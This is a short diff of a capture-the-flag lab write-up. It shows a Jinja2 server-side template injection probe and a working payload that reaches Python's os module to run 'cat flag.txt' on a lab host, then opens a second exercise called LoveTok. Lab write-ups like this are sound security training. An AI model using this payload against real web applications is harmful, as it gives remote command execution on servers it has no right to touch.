@@ -86,10 +86,11 @@ http://167.99.90.179:31306/{{7*7}} → displays "49"
 
 ### Exploit:
 We injected a Jinja2 SSTI payload:
-```python
+
 {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
 
 This displayed the contents of flag.txt via an error message.
+
 6. Experiment B: LoveTok
 
 Objective: Retrieve contents of the flag folder from 134.209.180.248:31901.
